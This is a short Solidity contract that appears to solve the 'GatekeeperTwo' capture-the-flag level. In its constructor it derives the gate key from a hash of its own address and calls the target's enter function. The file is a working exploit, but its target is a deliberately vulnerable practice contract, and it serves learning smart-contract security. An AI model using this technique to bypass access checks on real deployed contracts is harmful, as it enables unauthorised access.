// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack_2 {
    constructor(address _target) {
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        IGatekeeperTwo(_target).enter(key);
    }
}
